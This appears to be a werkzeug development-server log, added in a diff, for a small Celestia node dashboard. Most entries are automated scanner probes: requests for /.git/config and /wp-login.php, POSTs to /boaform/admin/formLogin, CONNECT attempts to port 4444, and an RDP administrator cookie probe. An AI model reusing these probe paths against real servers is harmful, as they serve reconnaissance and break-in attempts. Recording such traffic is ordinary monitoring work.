+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:40] "GET /static/js/notify.js HTTP/1.1" 200 -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:40] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+INFO:werkzeug:165.154.134.205 - - [26/Apr/2023 14:52:40] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+ERROR:werkzeug:161.35.230.3 - - [26/Apr/2023 15:31:11] code 400, message Bad request syntax ('\x00\x0e8\x17ÀÜþ\x0f.dB\x00\x00\x00\x00\x00')
+INFO:werkzeug:161.35.230.3 - - [26/Apr/2023 15:31:11] "[35m[1m 8ÀÜþ.dB     [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:66.175.213.4 - - [26/Apr/2023 15:57:27] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:66.175.213.4 - - [26/Apr/2023 15:57:27] "[35m[1m   ÿôè@¥±Ji.ú»Qc0J¾<.   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:134.122.135.54 - - [26/Apr/2023 16:15:40] "[33mGET /mz/70970.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:3.15.9.213 - - [26/Apr/2023 16:18:18] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+INFO:werkzeug:85.217.144.136 - - [26/Apr/2023 17:33:14] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:85.217.144.136 - - [26/Apr/2023 17:41:42] "[33mCONNECT 84.153.78.7:4444 HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 18:08:19] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:194.165.16.76 - - [26/Apr/2023 18:33:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:194.165.16.76 - - [26/Apr/2023 18:33:25] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:162.243.139.19 - - [26/Apr/2023 19:31:16] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+INFO:werkzeug:107.170.226.21 - - [26/Apr/2023 19:32:05] "[33mGET /hudson HTTP/1.1[0m" 404 -
+INFO:werkzeug:149.56.151.201 - - [26/Apr/2023 19:43:32] "[33mGET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.79 - - [26/Apr/2023 19:49:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 20:02:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:205.210.31.41 - - [26/Apr/2023 20:19:27] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:113.142.131.55 - - [26/Apr/2023 20:23:01] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.251 - - [26/Apr/2023 20:58:58] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.204.139.118 - - [26/Apr/2023 21:41:29] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [26/Apr/2023 21:50:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:146.190.166.168 - - [26/Apr/2023 22:16:04] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:146.190.166.168 - - [26/Apr/2023 22:16:12] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:146.190.166.168 - - [26/Apr/2023 22:16:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.88.66.237 - - [26/Apr/2023 22:48:07] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+ERROR:werkzeug:107.170.238.18 - - [27/Apr/2023 00:10:47] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:107.170.238.18 - - [27/Apr/2023 00:10:47] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:179.43.177.243 - - [27/Apr/2023 00:41:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [27/Apr/2023 00:42:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:223.240.101.111 - - [27/Apr/2023 01:24:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:118.123.105.86 - - [27/Apr/2023 01:41:07] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:118.123.105.86 - - [27/Apr/2023 01:41:09] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.86 - - [27/Apr/2023 01:41:09] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.86 - - [27/Apr/2023 01:41:10] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.233.19.5 - - [27/Apr/2023 01:44:38] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:205.210.31.38 - - [27/Apr/2023 03:09:20] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03JS}\x0fB\x19\x08º84*\x03r\x80>¿')
+INFO:werkzeug:205.210.31.38 - - [27/Apr/2023 03:09:20] "[35m[1m Ê  ÆJS}Bº84*r>¿[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:37.221.92.199 - - [27/Apr/2023 03:20:40] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.10.87.208 - - [27/Apr/2023 03:45:53] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:104.152.52.138 - - [27/Apr/2023 04:02:42] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:193.32.162.159 - - [27/Apr/2023 04:25:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:78.188.48.240 - - [27/Apr/2023 04:40:01] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:179.43.177.243 - - [27/Apr/2023 04:45:24] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+ERROR:werkzeug:185.161.248.53 - - [27/Apr/2023 04:55:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:185.161.248.53 - - [27/Apr/2023 04:55:40] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:173.201.185.119 - - [27/Apr/2023 05:56:06] "[33mGET /style.php?sig=rename HTTP/1.1[0m" 404 -
+INFO:werkzeug:173.201.185.119 - - [27/Apr/2023 05:56:06] "[33mGET /wp-admin/style.php?sig=rename HTTP/1.1[0m" 404 -
+INFO:werkzeug:103.187.191.1 - - [27/Apr/2023 06:14:14] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:125.164.22.97 - - [27/Apr/2023 06:36:55] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [27/Apr/2023 07:17:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:39] "GET /static/css/styles.css HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:39] "GET /static/img/celestia-logo.svg HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:39] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:39] "GET /static/js/notify.js HTTP/1.1" 200 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:40] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "GET /balance HTTP/1.1" 200 36
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:27:40] "GET /node_status HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:35] "[36mGET /static/css/styles.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:35] "[36mGET /static/img/celestia-logo.svg HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:36] "[36mGET /static/js/main.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:36] "[36mGET /static/js/notify.js HTTP/1.1[0m" 304 -
+DEBUG:urllib3.connectionpool:Starting new HTTP connection (1): 127.0.0.1:26659
+DEBUG:urllib3.connectionpool:http://127.0.0.1:26659 "GET /balance HTTP/1.1" 200 36
+INFO:werkzeug:14.241.236.189 - - [27/Apr/2023 07:36:37] "GET /node_status HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [27/Apr/2023 07:53:26] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:185.224.128.219 - - [27/Apr/2023 08:32:50] code 400, message Bad request version ("eWøàG\x00\x0f/vüº\x0f\x9e+\x00Æ\x13\x01\x13\x02\x13\x03\x13\x04\x13\x05À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+INFO:werkzeug:185.224.128.219 - - [27/Apr/2023 08:32:50] "[35m[1m                    ¨ ¤ÇW"ß P^ß&õL/s,%äìUâp¯Ì ×@ÂûÔµÓzÔO)²õeWøàG /vüº+ ÆÀ,À0 £ Ì©Ì¨ÌªÀ¯À­À£ÀÀ]ÀaÀWÀS §À+À/ ¢ À®À¬À¢ÀÀ\À`ÀVÀR ¦À$À( k jÀsÀw Ä Ã m ÅÀ#À' g @ÀrÀv ¾ ½ l ¿À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.5.3.10:80
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
